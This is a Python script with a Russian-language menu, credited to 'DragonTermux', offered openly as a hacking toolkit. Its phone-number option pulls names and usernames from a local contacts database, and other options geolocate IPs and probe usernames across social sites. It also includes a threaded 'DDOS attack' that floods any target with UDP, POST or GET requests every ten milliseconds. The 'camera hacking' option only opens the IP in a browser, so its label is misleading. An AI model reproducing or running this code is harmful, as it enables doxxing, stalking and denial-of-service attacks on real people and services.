import phonenumbers
from phonenumbers import geocoder, carrier, timezone
import requests
import webbrowser
import socket
import threading
import time
import csv

# Цвета для текста
red = "\033[31m"
purple = "\033[35m"
yellow = "\033[33m"
green = "\033[32m"
reset = "\033[0m"

print(f"{red}Прогружаем все библиотеки...")
time.sleep(1)
print(f"Прогружаем Базу Данных...{reset}")

# Переменные для отправки запросов
stop_sending = False

# Загрузка всех контактов из CSV
def load_contacts_from_csv(file_path):
    contacts = {}
    try:
        with open(file_path, mode='r', encoding='utf-8') as csv_file:
            csv_reader = csv.reader(csv_file)
            for row in csv_reader:
                if len(row) >= 5:
                    phone = row[1].strip()
                    username = row[2].strip()
                    first_name = row[3].strip()
                    last_name = row[4].strip()
                    contacts[phone] = {
                        'username': username,
                        'first_name': first_name,
                        'last_name': last_name
                    }
    except FileNotFoundError:
        print(f"{red}Ошибка: файл не найден.{reset}")
    return contacts

# Получение информации о номере
def get_contact_info(phone_number, contacts):
    contact_info = contacts.get(phone_number.strip(), {})
    if not contact_info:
        return f"{red}Контакт не найден в базе данных.{reset}"
    
    return (f"{red}Имя: {contact_info.get('first_name', 'Неизвестно')}\n"
            f"Фамилия: {contact_info.get('last_name', 'Неизвестно')}\n"
            f"Юзернейм: {contact_info.get('username', 'Неизвестно')}{reset}")
            
def main_menu():
    print(f"{red}╔══╗─╔═══╗╔══╗╔═══╗╔══╗╔╗─╔╗")
    print(f"║╔╗╚╗║╔═╗║║╔╗║║╔══╝║╔╗║║╚═╝║")
    print(f"║║╚╗║║╚═╝║║╚╝║║║╔═╗║║║║║╔╗─║")
    print(f"║║─║║║╔╗╔╝║╔╗║║║╚╗║║║║║║║╚╗║")
    print(f"║╚═╝║║║║║─║║║║║╚═╝║║╚╝║║║─║║")
    print(f"╚═══╝╚╝╚╝─╚╝╚╝╚═══╝╚══╝╚╝─╚╝")
    print(f"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    print(f"       By DragonTermux")
    print(f"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    print(f"[1] Пробив по номеру телефона")
    print(f"[2] Пробив по IP")
    print(f"[3] DDOS атака")
    print(f"[4] Взлом Видеокамеры")
    print(f"[5] Пробив по нику")  
    print(f"[6] Выйти из меню{reset}")
    print()
    choice = input(f"{purple}[#]{yellow}Введите цифру: {reset}")
    return choice

def check_number_info(phone_number):
    try:
        parsed_number = phonenumbers.parse(phone_number)
        if not phonenumbers.is_valid_number(parsed_number):
            return f"{red}Неверный или невалидный номер телефона.{reset}"
        country = geocoder.country_name_for_number(parsed_number, "ru")
        region = geocoder.description_for_number(parsed_number, "ru")
        operator = carrier.name_for_number(parsed_number, "ru")
        timezones = timezone.time_zones_for_number(parsed_number)

        return (f"{red}Номер: {phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}\n"
                f"Страна: {country}\n"
                f"Регион: {region}\n"
                f"Оператор: {operator}\n"
                f"Часовой пояс: {', '.join(timezones)}{reset}")
    except phonenumbers.phonenumberutil.NumberParseException:
        return f"{red}Ошибка при разборе номера. Проверьте правильность введённого номера.{reset}"

def get_ip_info(ip_address):
    url = f"https://ipwho.is/{ip_address}"
    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()
        if data['success']:
            latitude = data['latitude']
            longitude = data['longitude']
            result = (f"{red}IP: {data['ip']}\n"
                      f"Тип IP: {data['type']}\n"
                      f"Страна: {data['country']}\n"
                      f"Регион: {data['region']}\n"
                      f"Город: {data['city']}\n"
                      f"Широта: {latitude}\n"
                      f"Долгота: {longitude}\n"
                      f"Часовой пояс: {data['timezone']['id']} (Текущее время: {data['timezone']['current_time']})\n"
                      f"Организация: {data['connection']['org']}\n"
                      f"ISP: {data['connection']['isp']}")
            open_map = input(f"{red}Хотите открыть местоположение в Google Картах (Да/Нет)? {reset}").strip().lower()
            if open_map == "да":
                google_maps_url = f"https://www.google.com/maps/search/?api=1&query={latitude},{longitude}"
                webbrowser.open(google_maps_url)
                print(f"Открываем Google Карты: {google_maps_url}")
            else:
                print(f"{red}Возвращаемся в меню...{reset}")
            return result
        else:
            return f"{red}Не удалось получить данные по IP-адресу.{reset}"
    else:
        return f"{red}Ошибка при запросе данных по IP-адресу.{reset}"

def phone_lookup(contacts):
    phone = input(f"{purple}[#]{yellow}Введите номер телефона (в формате +7XXXXXXXXXX): {reset}")
    normalized_phone = phone.lstrip('+')
    print(f"{red}Ищем информацию...{reset}")
    info = get_contact_info(normalized_phone, contacts)
    print(info)

    parsed_number = phonenumbers.parse(phone)
    number_info = check_number_info(phone)
    print(number_info)

def ip_lookup():
    ip = input(f"{purple}[#]{yellow}Введите IP-адрес: {reset}")
    print(f"{red}Ищем информацию...{reset}")
    info = get_ip_info(ip)
    print(info)

def lookup_by_username(username):
    print(f"{red}Ищем информацию о пользователе...{reset}")
    sites = [
        f"https://vk.com/{username}",
        f"https://github.com/{username}",
        f"https://t.me/{username}",
        f"https://www.tiktok.com/@{username}",
        f"https://www.youtube.com/@{username}",
    ]
    
    for site in sites:
        response = requests.get(site)
        if response.status_code == 200:
            print(f"{green}Найдено: {site}{reset}")
        else:
            print(f"{red}Не найдено: {site}{reset}")

def send_requests(request_type, url):
    global stop_sending
    while not stop_sending:
        try:
            if request_type == "1":  # UDP
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"Test UDP Packet", (url, 80))
            elif request_type == "2":  # HTTP POST
                requests.post(url, data={"key": "value"})
            elif request_type == "3":  # HTTP GET
                requests.get(url)
            print(f"{red}Запрос отправлен на {url}{reset}")
        except Exception as e:
            print(f"Ошибка: {e}")
        time.sleep(0.01)  # Задержка в 10 миллисекунд

def request_sender():
    global stop_sending
    request_type = input(f"{purple}[#]{yellow}Введите тип запроса (1 - UDP, 2 - POST, 3 - GET): {reset}")
    url = input(f"{purple}[#]{yellow}Введите URL: {reset}")
    stop_sending = False
    threading.Thread(target=send_requests, args=(request_type, url)).start()
    input(f"{purple}[#]{yellow}Нажмите Enter для остановки отправки запросов...{reset}")
    stop_sending = True

def camera_view():
    camera_id = input(f"{purple}[#]{yellow}Введите IP видеокамеры: {reset}")
    ip_address = f"http://{camera_id}"  # Формирование URL
    webbrowser.open(ip_address)  # Открытие URL в браузере
    print(f"{red}Открываем видеокамеру: {ip_address}{reset}")

def exit_program():
    print(f"{red}Выход из программы...{reset}")
    exit(0)

# Загрузка контактов
contacts = load_contacts_from_csv('database.csv')

# Основной цикл программы
while True:
    user_choice = main_menu()

    if user_choice == "1":
        phone_lookup(contacts)
    elif user_choice == "2":
        ip_lookup()
    elif user_choice == "3":
        request_sender()
    elif user_choice == "4":
        camera_view()
    elif user_choice == "5":
        username = input(f"{purple}[#]{yellow}Введите ник пользователя(без @): {reset}")
        lookup_by_username(username)
    elif user_choice == "6":
        exit_program()
    else:
        print("Неверный ввод, попробуйте снова.\n")